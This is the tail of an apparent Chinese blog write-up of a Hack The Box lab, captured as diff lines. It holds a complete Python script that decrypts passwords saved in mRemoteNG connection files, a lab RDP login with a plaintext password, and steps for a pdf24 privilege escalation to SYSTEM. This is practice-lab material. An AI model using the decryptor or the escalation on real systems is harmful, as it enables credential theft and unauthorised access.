+<span class="pl-k">import</span> <span class="pl-s1">hashlib</span>
+<span class="pl-k">import</span> <span class="pl-s1">base64</span>
+<span class="pl-k">from</span> <span class="pl-v">Cryptodome</span>.<span class="pl-v">Cipher</span> <span class="pl-k">import</span> <span class="pl-c1">AES</span>
+<span class="pl-k">from</span> <span class="pl-v">Cryptodome</span>.<span class="pl-v">Util</span>.<span class="pl-v">Padding</span> <span class="pl-k">import</span> <span class="pl-s1">unpad</span>
+<span class="pl-k">import</span> <span class="pl-s1">argparse</span>
+<span class="pl-k">import</span> <span class="pl-s1">sys</span>
+<span class="pl-k">import</span> <span class="pl-s1">xml</span>.<span class="pl-s1">etree</span>.<span class="pl-v">ElementTree</span> <span class="pl-k">as</span> <span class="pl-c1">ET</span>
+
+
+<span class="pl-k">def</span> <span class="pl-en">decrypt_legacy</span>(<span class="pl-s1">encrypted_data</span>, <span class="pl-s1">password</span>):
+    <span class="pl-k">try</span>:
+        <span class="pl-s1">encrypted_data</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>.<span class="pl-c1">strip</span>()
+        <span class="pl-s1">encrypted_data</span> <span class="pl-c1">=</span> <span class="pl-s1">base64</span>.<span class="pl-c1">b64decode</span>(<span class="pl-s1">encrypted_data</span>)
+        <span class="pl-s1">initial_vector</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>[:<span class="pl-c1">16</span>]
+        <span class="pl-s1">ciphertext</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>[<span class="pl-c1">16</span>:]
+        <span class="pl-s1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">md5</span>(<span class="pl-s1">password</span>.<span class="pl-c1">encode</span>()).<span class="pl-c1">digest</span>()
+
+        <span class="pl-s1">cipher</span> <span class="pl-c1">=</span> <span class="pl-c1">AES</span>.<span class="pl-c1">new</span>(<span class="pl-s1">key</span>, <span class="pl-c1">AES</span>.<span class="pl-c1">MODE_CBC</span>, <span class="pl-s1">initial_vector</span>)
+        <span class="pl-s1">plaintext</span> <span class="pl-c1">=</span> <span class="pl-en">unpad</span>(<span class="pl-s1">cipher</span>.<span class="pl-c1">decrypt</span>(<span class="pl-s1">ciphertext</span>), <span class="pl-c1">AES</span>.<span class="pl-c1">block_size</span>)
+        <span class="pl-k">return</span> <span class="pl-s1">plaintext</span>
+    <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"Failed to decrypt the password with the following error: {}"</span>.<span class="pl-c1">format</span>(<span class="pl-s1">e</span>))
+        <span class="pl-k">return</span> <span class="pl-s">b''</span>
+
+<span class="pl-k">def</span> <span class="pl-en">decrypt</span>(<span class="pl-s1">encrypted_data</span>, <span class="pl-s1">password</span>):
+    <span class="pl-k">try</span>:
+        <span class="pl-s1">encrypted_data</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>.<span class="pl-c1">strip</span>()
+        <span class="pl-s1">encrypted_data</span> <span class="pl-c1">=</span> <span class="pl-s1">base64</span>.<span class="pl-c1">b64decode</span>(<span class="pl-s1">encrypted_data</span>)
+        <span class="pl-s1">salt</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>[:<span class="pl-c1">16</span>]
+        <span class="pl-s1">associated_data</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>[:<span class="pl-c1">16</span>]
+        <span class="pl-s1">nonce</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>[<span class="pl-c1">16</span>:<span class="pl-c1">32</span>]
+        <span class="pl-s1">ciphertext</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>[<span class="pl-c1">32</span>:<span class="pl-c1">-</span><span class="pl-c1">16</span>]
+        <span class="pl-s1">tag</span> <span class="pl-c1">=</span> <span class="pl-s1">encrypted_data</span>[<span class="pl-c1">-</span><span class="pl-c1">16</span>:]
+        <span class="pl-s1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">pbkdf2_hmac</span>(
+            <span class="pl-s">"sha1"</span>, <span class="pl-s1">password</span>.<span class="pl-c1">encode</span>(), <span class="pl-s1">salt</span>, <span class="pl-c1">1000</span>, <span class="pl-s1">dklen</span><span class="pl-c1">=</span><span class="pl-c1">32</span>)
+
+        <span class="pl-s1">cipher</span> <span class="pl-c1">=</span> <span class="pl-c1">AES</span>.<span class="pl-c1">new</span>(<span class="pl-s1">key</span>, <span class="pl-c1">AES</span>.<span class="pl-c1">MODE_GCM</span>, <span class="pl-s1">nonce</span><span class="pl-c1">=</span><span class="pl-s1">nonce</span>)
+        <span class="pl-s1">cipher</span>.<span class="pl-c1">update</span>(<span class="pl-s1">associated_data</span>)
+        <span class="pl-s1">plaintext</span> <span class="pl-c1">=</span> <span class="pl-s1">cipher</span>.<span class="pl-c1">decrypt_and_verify</span>(<span class="pl-s1">ciphertext</span>, <span class="pl-s1">tag</span>)
+        <span class="pl-k">return</span> <span class="pl-s1">plaintext</span>
+    <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"Failed to decrypt the password with the following error: {}"</span>.<span class="pl-c1">format</span>(<span class="pl-s1">e</span>))
+        <span class="pl-k">return</span> <span class="pl-s">b''</span>
+
+
+<span class="pl-k">def</span> <span class="pl-en">main</span>():
+    <span class="pl-s1">parser</span> <span class="pl-c1">=</span> <span class="pl-s1">argparse</span>.<span class="pl-c1">ArgumentParser</span>(
+        <span class="pl-s1">description</span><span class="pl-c1">=</span><span class="pl-s">"Decrypt mRemoteNG passwords."</span>)
+    <span class="pl-k">if</span> <span class="pl-en">len</span>(<span class="pl-s1">sys</span>.<span class="pl-c1">argv</span>) <span class="pl-c1">&lt;</span> <span class="pl-c1">2</span>:
+        <span class="pl-s1">parser</span>.<span class="pl-c1">print_help</span>(<span class="pl-s1">sys</span>.<span class="pl-c1">stderr</span>)
+        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+
+    <span class="pl-s1">group</span> <span class="pl-c1">=</span> <span class="pl-s1">parser</span>.<span class="pl-c1">add_mutually_exclusive_group</span>()
+    <span class="pl-s1">group</span>.<span class="pl-c1">add_argument</span>(
+        <span class="pl-s">"-f"</span>, <span class="pl-s">"--file"</span>, <span class="pl-s1">help</span><span class="pl-c1">=</span><span class="pl-s">"Name of file containing mRemoteNG password"</span>)
+    <span class="pl-c"># Thanks idea from @KingKorSin</span>
+    <span class="pl-s1">group</span>.<span class="pl-c1">add_argument</span>(
+        <span class="pl-s">"-rf"</span>, <span class="pl-s">"--realFile"</span>, <span class="pl-s1">help</span><span class="pl-c1">=</span><span class="pl-s">"Name of the Real mRemoteNG connections file containing the passwords"</span>)
+    <span class="pl-s1">group</span>.<span class="pl-c1">add_argument</span>(
+        <span class="pl-s">"-s"</span>, <span class="pl-s">"--string"</span>, <span class="pl-s1">help</span><span class="pl-c1">=</span><span class="pl-s">"base64 string of mRemoteNG password"</span>)
+    <span class="pl-s1">parser</span>.<span class="pl-c1">add_argument</span>(<span class="pl-s">"-p"</span>, <span class="pl-s">"--password"</span>,
+                        <span class="pl-s1">help</span><span class="pl-c1">=</span><span class="pl-s">"Custom password"</span>, <span class="pl-s1">default</span><span class="pl-c1">=</span><span class="pl-s">"mR3m"</span>)
+    <span class="pl-s1">parser</span>.<span class="pl-c1">add_argument</span>(<span class="pl-s">"-L"</span>, <span class="pl-s">"--legacy"</span>, <span class="pl-s1">help</span><span class="pl-c1">=</span><span class="pl-s">"version &lt;= 1.74"</span>, <span class="pl-s1">type</span><span class="pl-c1">=</span><span class="pl-s1">bool</span>, <span class="pl-s1">default</span><span class="pl-c1">=</span><span class="pl-c1">False</span>)
+    <span class="pl-s1">args</span> <span class="pl-c1">=</span> <span class="pl-s1">parser</span>.<span class="pl-c1">parse_args</span>()
+
+    <span class="pl-s1">decrypt_func</span> <span class="pl-c1">=</span> <span class="pl-s1">decrypt</span>
+    <span class="pl-k">if</span> <span class="pl-s1">args</span>.<span class="pl-c1">legacy</span>:
+        <span class="pl-s1">decrypt_func</span> <span class="pl-c1">=</span> <span class="pl-s1">decrypt_legacy</span>
+
+    <span class="pl-k">if</span> <span class="pl-s1">args</span>.<span class="pl-c1">realFile</span> <span class="pl-c1">!=</span> <span class="pl-c1">None</span>:
+        <span class="pl-s1">tree</span> <span class="pl-c1">=</span> <span class="pl-c1">ET</span>.<span class="pl-c1">parse</span>(<span class="pl-s1">args</span>.<span class="pl-c1">realFile</span>)
+        <span class="pl-s1">root</span> <span class="pl-c1">=</span> <span class="pl-s1">tree</span>.<span class="pl-c1">getroot</span>()
+        <span class="pl-k">for</span> <span class="pl-s1">node</span> <span class="pl-c1">in</span> <span class="pl-s1">root</span>.<span class="pl-c1">iter</span>(<span class="pl-s">'Node'</span>):
+            <span class="pl-k">if</span> <span class="pl-s1">node</span>.<span class="pl-c1">attrib</span>[<span class="pl-s">'Password'</span>]:
+                <span class="pl-s1">decPass</span> <span class="pl-c1">=</span> <span class="pl-en">decrypt_func</span>(<span class="pl-s1">node</span>.<span class="pl-c1">attrib</span>[<span class="pl-s">'Password'</span>], <span class="pl-s1">args</span>.<span class="pl-c1">password</span>)
+                <span class="pl-k">if</span> <span class="pl-s1">node</span>.<span class="pl-c1">attrib</span>[<span class="pl-s">'Username'</span>]:
+                    <span class="pl-en">print</span>(<span class="pl-s">"Username: {}"</span>.<span class="pl-c1">format</span>(<span class="pl-s1">node</span>.<span class="pl-c1">attrib</span>[<span class="pl-s">'Username'</span>]))
+                <span class="pl-k">if</span> <span class="pl-s1">node</span>.<span class="pl-c1">attrib</span>[<span class="pl-s">'Hostname'</span>]:
+                    <span class="pl-en">print</span>(<span class="pl-s">"Hostname: {}"</span>.<span class="pl-c1">format</span>(<span class="pl-s1">node</span>.<span class="pl-c1">attrib</span>[<span class="pl-s">'Hostname'</span>]))
+                <span class="pl-en">print</span>(<span class="pl-s">"Password: {} <span class="pl-cce">\n</span>"</span>.<span class="pl-c1">format</span>(<span class="pl-s1">decPass</span>.<span class="pl-c1">decode</span>(<span class="pl-s">"utf-8"</span>)))
+        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+
+    <span class="pl-k">elif</span> <span class="pl-s1">args</span>.<span class="pl-c1">file</span> <span class="pl-c1">!=</span> <span class="pl-c1">None</span>:
+        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">args</span>.<span class="pl-c1">file</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+            <span class="pl-s1">encrypted_data</span> <span class="pl-c1">=</span> <span class="pl-s1">f</span>.<span class="pl-c1">read</span>()
+            <span class="pl-s1">decPass</span> <span class="pl-c1">=</span> <span class="pl-en">decrypt</span>(<span class="pl-s1">encrypted_data</span>, <span class="pl-s1">args</span>.<span class="pl-c1">password</span>)
+
+    <span class="pl-k">elif</span> <span class="pl-s1">args</span>.<span class="pl-c1">string</span> <span class="pl-c1">!=</span> <span class="pl-c1">None</span>:
+        <span class="pl-s1">encrypted_data</span> <span class="pl-c1">=</span> <span class="pl-s1">args</span>.<span class="pl-c1">string</span>
+        <span class="pl-s1">decPass</span> <span class="pl-c1">=</span> <span class="pl-en">decrypt</span>(<span class="pl-s1">encrypted_data</span>, <span class="pl-s1">args</span>.<span class="pl-c1">password</span>)
+
+    <span class="pl-k">else</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"Please use either the file (-f, --file) or string (-s, --string) flag"</span>)
+        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+
+    <span class="pl-k">try</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"Password: {}"</span>.<span class="pl-c1">format</span>(<span class="pl-s1">decPass</span>.<span class="pl-c1">decode</span>(<span class="pl-s">"utf-8"</span>)))
+    <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"Failed to find the password property with the following error: {}"</span>.<span class="pl-c1">format</span>(<span class="pl-s1">e</span>))
+
+
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-en">main</span>()</pre></div>
+<p>这是github开源项目，懒人可以直接复制了</p>
+<p>xfreerdp3连上即可</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> xfreerdp3 /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6</span></pre></div>
+<p>在桌面下可以发现pdf24，pdf24 11.15.1存在提权漏洞可以提升为system</p>
+<p>首先去下载SetOpLock.exe<br>
+<a href="https://github.com/googleprojectzero/symboliclink-testing-tools">googleprojectzero/symboliclink-testing-tools</a></p>
+<p><strong>运行pdf24安装程序，点击修复，等待弹出cmd黑框，顶部导航栏打开属性，底部有legacy console mode选项，点击使用非ie和edge浏览器打开，ctrl+o打开选项卡，顶部输入cmd即可提权</strong></p>
+<h1>不详细演示，不喜欢贴图片</h1>
+<p><a href="https://0xdf.gitlab.io/2025/08/21/htb-lock.html#shell-as-system" rel="nofollow">HTB：锁定 |0xdf破解东西</a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
